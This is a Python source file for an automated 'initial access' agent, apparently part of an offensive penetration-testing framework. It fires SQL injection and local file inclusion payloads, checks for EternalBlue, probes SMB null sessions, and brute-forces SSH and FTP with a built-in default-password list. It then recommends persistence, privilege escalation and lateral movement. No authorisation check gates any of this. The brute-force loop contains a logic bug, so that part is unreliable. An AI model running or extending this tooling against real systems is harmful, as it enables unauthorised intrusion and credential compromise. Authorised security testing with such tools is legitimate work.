"""
Initial Access Agent - Specialized agent for gaining initial foothold on targets.
"""

import asyncio
import subprocess
import json
import os
from typing import Dict, List, Optional, Any
from .base_agent import Agent

class InitialAccessAgent(Agent):
    """
    Specialized agent for gaining initial access to target systems.
    Focuses on exploiting vulnerabilities and weak configurations.
    """
    
    def __init__(self):
        super().__init__(name="initial_access_agent")
        
        self.exploit_database = {
            'web': ['sql_injection', 'xss', 'file_upload', 'lfi', 'rfi'],
            'smb': ['eternal_blue', 'smb_relay', 'null_session'],
            'ssh': ['brute_force', 'key_reuse', 'weak_ciphers'],
            'ftp': ['anonymous_access', 'brute_force', 'bounce_attack'],
            'general': ['buffer_overflow', 'privilege_escalation', 'misconfigurations']
        }
        
        self.common_credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', ''),
            ('root', 'root'), ('root', 'toor'), ('root', ''),
            ('administrator', 'administrator'), ('administrator', 'password'),
            ('guest', 'guest'), ('guest', ''), ('user', 'user'),
            ('test', 'test'), ('demo', 'demo')
        ]
        
        self.successful_exploits = []
    
    async def configure(self, config: dict):
        """Configure the agent with specific parameters"""
        if 'target_network' in config:
            self.target_network = config['target_network']
        if 'exploit_types' in config:
            self.exploit_types = config['exploit_types']
        if 'credentials' in config:
            self.common_credentials.extend(config['credentials'])
        
        self.logger.info(f"InitialAccessAgent configured")
        return {"success": True, "configured": True}
    
    async def attempt_initial_access(self, target: str, recon_data: Dict) -> Dict:
        """
        Attempt to gain initial access to a target using reconnaissance data.
        
        Args:
            target: Target IP address or hostname
            recon_data: Reconnaissance data from recon agent
            
        Returns:
            Results of initial access attempts
        """
        print(f"🎯 Attempting initial access on {target}")
        
        results = {
            "target": target,
            "access_attempts": [],
            "successful_exploits": [],
            "credentials_found": [],
            "next_steps": [],
            "overall_status": "failed"
        }
        
        services = await self._extract_services_from_recon(recon_data)
        
        for service in services:
            service_type = service.get('type', 'general')
            exploit_results = await self._attempt_service_exploitation(target, service, service_type)
            results["access_attempts"].append(exploit_results)
            
            if exploit_results.get("success"):
                results["successful_exploits"].append(exploit_results)
                results["overall_status"] = "success"
        
        cred_results = await self._attempt_credential_attacks(target, services)
        results["access_attempts"].extend(cred_results)
        
        for cred_result in cred_results:
            if cred_result.get("success"):
                results["credentials_found"].append(cred_result)
                results["overall_status"] = "success"
        
        results["next_steps"] = await self._generate_next_steps(results)
        
        if results["successful_exploits"]:
            self.successful_exploits.extend(results["successful_exploits"])
        
        return results
    
    async def exploit_web_vulnerability(self, target: str, port: int, vuln_type: str) -> Dict:
        """
        Exploit a specific web vulnerability.
        
        Args:
            target: Target IP or hostname
            port: Web service port
            vuln_type: Type of vulnerability to exploit
            
        Returns:
            Exploitation results
        """
        base_url = f"http://{target}:{port}"
        
        print(f"🌐 Exploiting {vuln_type} on {base_url}")
        
        if vuln_type == 'sql_injection':
            return await self._exploit_sql_injection(base_url)
        elif vuln_type == 'file_upload':
            return await self._exploit_file_upload(base_url)
        elif vuln_type == 'lfi':
            return await self._exploit_lfi(base_url)
        elif vuln_type == 'directory_traversal':
            return await self._exploit_directory_traversal(base_url)
        else:
            return await self._generic_web_exploit(base_url, vuln_type)
    
    async def exploit_smb_vulnerability(self, target: str, vuln_type: str) -> Dict:
        """
        Exploit SMB vulnerabilities.
        
        Args:
            target: Target IP address
            vuln_type: Type of SMB vulnerability
            
        Returns:
            Exploitation results
        """
        print(f"📁 Exploiting SMB {vuln_type} on {target}")
        
        if vuln_type == 'eternal_blue':
            return await self._exploit_eternal_blue(target)
        elif vuln_type == 'null_session':
            return await self._exploit_smb_null_session(target)
        else:
            return await self._generic_smb_exploit(target, vuln_type)
    
    async def brute_force_service(self, target: str, service: str, port: int, userlist: Optional[List[str]] = None) -> Dict:
        """
        Perform brute force attack on a service.
        
        Args:
            target: Target IP address
            service: Service name (ssh, ftp, etc.)
            port: Service port
            userlist: List of usernames to try
            
        Returns:
            Brute force results
        """
        print(f"🔨 Brute forcing {service} on {target}:{port}")
        
        if not userlist:
            userlist = ['admin', 'root', 'administrator', 'user', 'guest']
        
        results = {
            "service": service,
            "target": f"{target}:{port}",
            "attempts": [],
            "successful_credentials": [],
            "success": False
        }
        
        for username in userlist:
            for _, password in self.common_credentials:
                if self.common_credentials[0][0] == username:  # Match username
                    attempt_result = await self._test_credentials(target, port, service, username, password)
                    results["attempts"].append(attempt_result)
                    
                    if attempt_result.get("success"):
                        results["successful_credentials"].append({
                            "username": username,
                            "password": password,
                            "service": service
                        })
                        results["success"] = True
                        return results
        
        return results
    
    async def _extract_services_from_recon(self, recon_data: Dict) -> List[Dict]:
        """Extract service information from reconnaissance data."""
        services = []
        
        enum_results = recon_data.get("enumeration_results", {})
        for key, result in enum_results.items():
            if "_" in key:
                port_service = key.split("_")
                if len(port_service) >= 2:
                    port = port_service[0]
                    service_type = port_service[1]
                    
                    services.append({
                        "port": port,
                        "type": service_type,
                        "data": result
                    })
        
        discovered_services = recon_data.get("discovered_services", [])
        for service in discovered_services:
            services.append({
                "port": service.get("port", ""),
                "type": self._categorize_service_type(service.get("service", "")),
                "data": service
            })
        
        return services
    
    def _categorize_service_type(self, service_name: str) -> str:
        """Categorize service type for exploitation."""
        service_lower = service_name.lower()
        
        if any(web in service_lower for web in ['http', 'https', 'web']):
            return 'web'
        elif any(smb in service_lower for smb in ['smb', 'netbios', 'microsoft-ds']):
            return 'smb'
        elif 'ssh' in service_lower:
            return 'ssh'
        elif 'ftp' in service_lower:
            return 'ftp'
        elif any(mail in service_lower for mail in ['smtp', 'pop3', 'imap']):
            return 'mail'
        else:
            return 'general'
    
    async def _attempt_service_exploitation(self, target: str, service: Dict, service_type: str) -> Dict:
        """Attempt exploitation of a specific service."""
        port = service.get("port", "").split("/")[0]
        
        result = {
            "service": service_type,
            "port": port,
            "target": target,
            "exploits_attempted": [],
            "success": False,
            "details": {}
        }
        
        available_exploits = self.exploit_database.get(service_type, [])
        
        for exploit in available_exploits[:3]:  # Limit to 3 exploits per service
            try:
                if service_type == 'web':
                    exploit_result = await self.exploit_web_vulnerability(target, int(port), exploit)
                elif service_type == 'smb':
                    exploit_result = await self.exploit_smb_vulnerability(target, exploit)
                else:
                    exploit_result = await self._generic_exploit_attempt(target, port, service_type, exploit)
                
                result["exploits_attempted"].append({
                    "exploit": exploit,
                    "result": exploit_result
                })
                
                if exploit_result.get("success"):
                    result["success"] = True
                    result["details"] = exploit_result
                    break
                    
            except Exception as e:
                result["exploits_attempted"].append({
                    "exploit": exploit,
                    "error": str(e)
                })
        
        return result
    
    async def _attempt_credential_attacks(self, target: str, services: List[Dict]) -> List[Dict]:
        """Attempt credential-based attacks on services."""
        results = []
        
        for service in services:
            service_type = service.get("type")
            port = service.get("port", "").split("/")[0]
            
            if service_type and service_type in ['ssh', 'ftp', 'smb']:
                try:
                    port_int = int(port)
                    brute_result = await self.brute_force_service(target, service_type, port_int)
                    results.append(brute_result)
                except ValueError:
                    continue
        
        return results
    
    async def _exploit_sql_injection(self, base_url: str) -> Dict:
        """Attempt SQL injection exploitation."""
        try:
            test_payloads = ["'", "' OR '1'='1", "' UNION SELECT 1--"]
            
            for payload in test_payloads:
                test_url = f"{base_url}/?id={payload}"
                
                cmd = ["curl", "-s", "--connect-timeout", "10", test_url]
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await process.communicate()
                
                if process.returncode == 0:
                    response = stdout.decode()
                    if any(error in response.lower() for error in ['sql', 'mysql', 'error', 'syntax']):
                        return {
                            "exploit": "sql_injection",
                            "success": True,
                            "payload": payload,
                            "evidence": "SQL error messages detected"
                        }
            
            return {
                "exploit": "sql_injection",
                "success": False,
                "reason": "No SQL injection vulnerabilities detected"
            }
            
        except Exception as e:
            return {
                "exploit": "sql_injection",
                "success": False,
                "error": str(e)
            }
    
    async def _exploit_file_upload(self, base_url: str) -> Dict:
        """Attempt file upload exploitation."""
        return {
            "exploit": "file_upload",
            "success": False,
            "reason": "No file upload functionality detected"
        }
    
    async def _exploit_lfi(self, base_url: str) -> Dict:
        """Attempt Local File Inclusion exploitation."""
        try:
            lfi_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd"
            ]
            
            for payload in lfi_payloads:
                test_url = f"{base_url}/?file={payload}"
                
                cmd = ["curl", "-s", "--connect-timeout", "10", test_url]
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await process.communicate()
                
                if process.returncode == 0:
                    response = stdout.decode()
                    if any(indicator in response for indicator in ['root:', 'bin:', 'daemon:']):
                        return {
                            "exploit": "lfi",
                            "success": True,
                            "payload": payload,
                            "evidence": "System file contents detected"
                        }
            
            return {
                "exploit": "lfi",
                "success": False,
                "reason": "No LFI vulnerabilities detected"
            }
            
        except Exception as e:
            return {
                "exploit": "lfi",
                "success": False,
                "error": str(e)
            }
    
    async def _exploit_directory_traversal(self, base_url: str) -> Dict:
        """Attempt directory traversal exploitation."""
        return await self._exploit_lfi(base_url)  # Similar to LFI
    
    async def _generic_web_exploit(self, base_url: str, vuln_type: str) -> Dict:
        """Generic web exploitation attempt."""
        return {
            "exploit": vuln_type,
            "success": False,
            "reason": f"No {vuln_type} exploitation implemented"
        }
    
    async def _exploit_eternal_blue(self, target: str) -> Dict:
        """Attempt EternalBlue exploitation."""
        try:
            cmd = ["nmap", "-p", "445", "--script", "smb-vuln-ms17-010", target]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                output = stdout.decode()
                if "VULNERABLE" in output:
                    return {
                        "exploit": "eternal_blue",
                        "success": True,
                        "evidence": "Target is vulnerable to MS17-010",
                        "recommendation": "Use Metasploit ms17_010_eternalblue module"
                    }
            
            return {
                "exploit": "eternal_blue",
                "success": False,
                "reason": "Target not vulnerable to EternalBlue"
            }
            
        except Exception as e:
            return {
                "exploit": "eternal_blue",
                "success": False,
                "error": str(e)
            }
    
    async def _exploit_smb_null_session(self, target: str) -> Dict:
        """Attempt SMB null session exploitation."""
        try:
            cmd = ["smbclient", "-L", target, "-N"]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                output = stdout.decode()
                if "Sharename" in output:
                    return {
                        "exploit": "smb_null_session",
                        "success": True,
                        "evidence": "Null session allowed",
                        "shares": output
                    }
            
            return {
                "exploit": "smb_null_session",
                "success": False,
                "reason": "Null session not allowed"
            }
            
        except Exception as e:
            return {
                "exploit": "smb_null_session",
                "success": False,
                "error": str(e)
            }
    
    async def _generic_smb_exploit(self, target: str, vuln_type: str) -> Dict:
        """Generic SMB exploitation attempt."""
        return {
            "exploit": vuln_type,
            "success": False,
            "reason": f"No {vuln_type} exploitation implemented"
        }
    
    async def _test_credentials(self, target: str, port: int, service: str, username: str, password: str) -> Dict:
        """Test credentials against a service."""
        try:
            if service == 'ssh':
                return await self._test_ssh_credentials(target, port, username, password)
            elif service == 'ftp':
                return await self._test_ftp_credentials(target, port, username, password)
            else:
                return {
                    "username": username,
                    "password": password,
                    "success": False,
                    "reason": f"Credential testing not implemented for {service}"
                }
                
        except Exception as e:
            return {
                "username": username,
                "password": password,
                "success": False,
                "error": str(e)
            }
    
    async def _test_ssh_credentials(self, target: str, port: int, username: str, password: str) -> Dict:
        """Test SSH credentials."""
        try:
            cmd = ["sshpass", "-p", password, "ssh", "-o", "ConnectTimeout=10", 
                   "-o", "StrictHostKeyChecking=no", f"{username}@{target}", "echo", "success"]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0 and "success" in stdout.decode():
                return {
                    "username": username,
                    "password": password,
                    "success": True,
                    "service": "ssh"
                }
            else:
                return {
                    "username": username,
                    "password": password,
                    "success": False,
                    "reason": "Authentication failed"
                }
                
        except Exception as e:
            return {
                "username": username,
                "password": password,
                "success": False,
                "error": str(e)
            }
    
    async def _test_ftp_credentials(self, target: str, port: int, username: str, password: str) -> Dict:
        """Test FTP credentials."""
        try:
            cmd = ["curl", "-u", f"{username}:{password}", f"ftp://{target}:{port}/", "--connect-timeout", "10"]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                return {
                    "username": username,
                    "password": password,
                    "success": True,
                    "service": "ftp"
                }
            else:
                return {
                    "username": username,
                    "password": password,
                    "success": False,
                    "reason": "Authentication failed"
                }
                
        except Exception as e:
            return {
                "username": username,
                "password": password,
                "success": False,
                "error": str(e)
            }
    
    async def _generic_exploit_attempt(self, target: str, port: str, service_type: str, exploit: str) -> Dict:
        """Generic exploitation attempt."""
        return {
            "exploit": exploit,
            "success": False,
            "reason": f"Generic exploitation not implemented for {service_type}"
        }
    
    async def _generate_next_steps(self, results: Dict) -> List[str]:
        """Generate next steps based on exploitation results."""
        next_steps = []
        
        if results["overall_status"] == "success":
            next_steps.append("Establish persistent access")
            next_steps.append("Perform privilege escalation")
            next_steps.append("Begin lateral movement")
            next_steps.append("Document successful attack vector")
        else:
            next_steps.append("Try additional exploitation techniques")
            next_steps.append("Perform more detailed vulnerability assessment")
            next_steps.append("Consider social engineering approaches")
            next_steps.append("Look for alternative attack vectors")
        
        if results["credentials_found"]:
            next_steps.append("Test credentials on other services")
            next_steps.append("Check for credential reuse across systems")
        
        return next_steps
